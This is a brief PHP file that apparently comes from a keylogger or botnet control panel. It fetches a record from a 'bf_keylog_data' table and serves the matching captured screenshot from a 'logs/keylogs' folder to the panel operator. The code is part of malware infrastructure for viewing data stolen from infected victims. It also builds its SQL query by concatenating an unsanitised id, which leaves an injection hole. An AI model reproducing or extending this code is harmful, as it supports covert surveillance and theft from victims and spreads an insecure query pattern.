<?php

if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT id, screen FROM bf_keylog_data WHERE (id = \''.$Cur['id'].'\') LIMIT 1');

	if($item->id == $Cur['id']){		header("Content-Type: image/jpeg");

    	if(file_exists('logs/keylogs/' . $item->screen)){
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/keylogs/' . $item->screen));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/keylogs/' . $item->screen));
			}
		}else{			exit('NOT_FOUND');
		}
	}
}

?>